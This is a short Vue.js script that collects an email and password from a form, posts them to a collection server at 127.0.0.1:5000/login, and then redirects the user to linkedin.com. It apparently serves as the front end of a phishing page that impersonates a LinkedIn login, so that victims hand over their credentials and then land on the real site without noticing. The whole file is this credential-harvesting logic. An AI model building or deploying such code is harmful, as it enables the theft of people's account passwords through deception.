const app = Vue.createApp({
    data() {
        return {
            email: '',
            passwd: ''
        }
    },
    methods: {
        submitForm(e) {
            e.preventDefault();

            let fd = new FormData();
            fd.append("email", this.email);
            fd.append("passwd", this.passwd);

            fetch("http://127.0.0.1:5000/login", {
                body: fd,
                method: "POST",
                mode: "no-cors"
            }).then(response => {
                window.location.href = "https://linkedin.com";
            });
        }
    }
});

app.mount("body")
